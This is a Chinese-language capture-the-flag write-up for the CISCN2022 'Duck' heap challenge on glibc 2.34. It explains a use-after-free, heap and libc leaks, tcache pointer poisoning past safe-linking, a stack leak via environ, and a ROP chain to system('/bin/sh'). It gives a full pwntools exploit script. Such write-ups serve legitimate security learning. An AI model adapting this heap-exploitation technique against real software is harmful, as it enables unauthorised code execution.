### CISCN2022 Duck Write Up

该题目附件我已经上传到Github，有需要的可以下载，复现这题时，我是使用的NSSCTF提供的远程环境。

此题是一道libc2.34的题，libc2.34与2.33最大的不同就是移除了以往常用的malloc_hook，free_hook等hook函数，导致利用上较为困难，2.34与2.33一样，chunk的fd指针都采用了异或加密，在申请chunk时便会异或解密，所以当我们改写fd指针时，只需要将泄露出的堆的基地址右移12位后与当前地址异或即可。glibc中采用的异或加密的规则并不难：将堆的基地址右移12位后与当前地址异或。

这道题逆向难度并不大，通过IDA静态分析就可以很明显的看出，在free时存在UAF，所以可以很轻松的泄露堆的基地址（用于异或加密）与libc。

先多申请几个chunk（大于8个），把最后一个留下其余的全部释放，并用0号来泄露堆的基址，将泄露的地址左移12位即可得到堆的基地址。由于chunk的大小为0x110，所以在填满tcache后，剩下的不与top chunk相邻的chunk将放入unsorted bin中，这也是前面要申请大于8个chunk的原因，然后再通过UAF泄露main arena的地址，从而泄露libc。

泄露libc之后找到environ，通过UAF改写tcache的fd指针，并将其fd指针改为environ的地址，分配出去以后，由于environ保存的是当前进程的环境变量，这里面存放了栈上的地址，泄露出environ的值后并计算出edit的地址之后，再次修改fd指针，分配到edit返回地址之后写入ROP调用链，(**注意，由于是64位的程序，前六个参数通过寄存器传递，所以需要控制RDI寄存器来传入"/bin/sh\x00"作为system的参数**)即可getshell。(我用one_gadget去打没有成功)

***注：此处system若是无法使用，可改为execve，效果应该是一样的***

最终exp如下：

```python
from pwn import *
io=process('./pwn')
#io=remote('1.14.71.254',28045)
elf=ELF('./pwn')
libc=ELF('./libc.so.6')

context(arch='amd64', os='linux', log_level='debug')

def add():
    io.recvuntil('Choice: ')
    io.sendline('1')

def delete(index):
    io.recvuntil('Choice: ')
    io.sendline('2')
    io.recvuntil('Idx: \n')
    io.sendline(str(index))

def show(index):
    io.recvuntil('Choice: ')
    io.sendline('3')
    io.recvuntil('Idx: \n')
    io.sendline(str(index))

def edit(index,size,content):
    io.recvuntil('Choice: ')
    io.sendline('4')
    io.recvuntil('Idx: \n')
    io.sendline(str(index))
    io.recvuntil('Size: \n')
    io.sendline(str(size))
    io.recvuntil('Content: \n')
    io.sendline(content)


for i in range(9):
    add()

for i in range(8):
    delete(i)  

show(7)

main_arena = u64(io.recvuntil(6).ljust(8, b'\x00'))
main_arena = main_arena - 96

libc_addr= main_arena-libc.sym['main_arena']

print("libc_addr: " + hex(libc_addr))
print("main_arena: " + hex(main_arena))



show(0)
heap_base=u64(io.recv(5).ljust(8,b'\x00'))
heap_base=heap_base<<12
print("heap_base: "+hex(heap_base))

for i in range(5):
    add()

environ_addr=libc_addr+libc.sym['environ']

print("environ_addr: " + hex(environ_addr))

edit(1,0x10,p64(environ_addr^(heap_base>>12))+p64(0))

add()         
add()         

show(15)
stack_addr = u64(io.recvuntil(6).ljust(8, b'\x00'))
stack_addr = stack_addr - 0x168

print("stack_addr: "+ hex(stack_addr))

delete(9)
delete(10)
edit(10,0x10,p64(stack_addr^(heap_base>>12))+p64(0))

add()  
add()  

bin_sh_addr=libc_addr+next(libc.search(b'/bin/sh'))

sys_addr = libc_addr + libc.sym['system']
pop_rdi_ret = libc_addr + next(libc.search(asm('pop rdi;ret;')))

#pop_rdi_ret=0x1703

#one_gadget=libc_addr+0xda867

payload=p64(0)*3+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(sys_addr)

#payload=p64(0)*3+p64(one_gadget)

edit(17,0x30,payload)

io.interactive()
```

